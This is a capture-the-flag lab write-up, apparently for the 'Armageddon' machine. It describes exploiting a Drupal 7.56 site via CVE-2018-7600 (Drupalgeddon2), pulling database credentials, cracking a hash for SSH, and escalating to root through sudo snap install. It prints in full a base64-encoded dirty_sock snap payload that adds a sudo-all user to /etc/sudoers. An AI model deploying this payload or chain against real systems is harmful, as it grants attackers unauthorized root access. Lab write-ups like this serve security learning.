---
layout: default
---

# Armageddon

![Armageddon](/images/Armageddon.png)

Drupal site that is vulnerable to [CVE-2018-7600] (https://nvd.nist.gov/vuln/detail/CVE-2018-7600). Once I had a command prompt I found the mysql credentials where I found a password hash. 
Once cracked I was able to login as a low priv user.

Once in I found the user had sudo rights to snap. Discovered it is vulnerable to dirty sock. Found a PoC that creates a user dirty_sock with full sudo rights.

## Enumeration

### Ports and Services

![PortsAndServices](/images/ports.png)

### Software Installed

* PHP 5.4.16
* Drupal 7.56 (changelog http://10.129.43.32/CHANGELOG.txt)

### Nmap Scan

![NMAPScan](/images/nmap.png)

### Initial Foothold

Found a changelog at http://10.129.43.32/CHANGELOG.txt and found the Drupal Version.
Drupal 7.56 is vulnerable to CVE-2018-7600
Downloaded and tried an exploit script

[Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

![Drupalgeddon2 Shell](/images/Drupalgeddon2Shell.png)

Found database info in /var/www/html/sites/default/settings.php

![Drupal SQL Settings](/images/Drupalgeddon2Shell.png)

Found username and password hash in drupal database in the Users table

![Drupal username and password hash](/images/PasswordHash.png)

Used john to crack the hash 

![Cracked Hash](/images/HashCracked.png)

Looks like user BruceTheRealAdmin re-uses passwords. SSH as brucetherealadmin successfully.

#### User.txt Proof

![User Proof](/images/UserProof.png)

### Privilege Escalation

User has passwordless access to snap install

![Sudo](/images/Sudo.png)

Was able to utilize a snap bug although the version shows it is not vulnerable. I believe this is because I am loading a malicious snap that create a user and allows all sudo as root.

Snap Version is 2.47

![SnapVer](/images/SnapVer.png)

Resource: [Dirty Exploit Python](https://github.com/initstring/dirty_sock)

Code used for creating snap payload:
```python
python3 -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > mysnap.snap
```

![Exploit](/images/Exploit.png)


#### Root.txt Proof
![RootProof](/images/RootProof.png)
